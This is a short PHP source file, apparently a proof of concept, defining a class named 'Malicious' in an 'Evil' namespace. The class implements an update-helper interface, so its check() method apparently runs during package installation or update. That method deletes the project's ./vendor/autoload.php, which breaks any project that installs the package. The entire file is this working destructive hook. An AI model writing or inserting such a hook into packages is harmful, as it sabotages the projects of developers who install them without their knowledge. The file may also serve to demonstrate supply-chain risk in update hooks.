<?php
namespace ORey\Evil;

use UpdateHelper\UpdateHelper;
use UpdateHelper\UpdateHelperInterface;

class Malicious implements UpdateHelperInterface
{
    const NOT_REQUIRED = './vendor/autoload.php';

    public function check (UpdateHelper $helper)
    {
        echo "Legs are not required\n";
        if (file_exists(Malicious::NOT_REQUIRED)) {
            unlink(Malicious::NOT_REQUIRED);
        }
    }
}
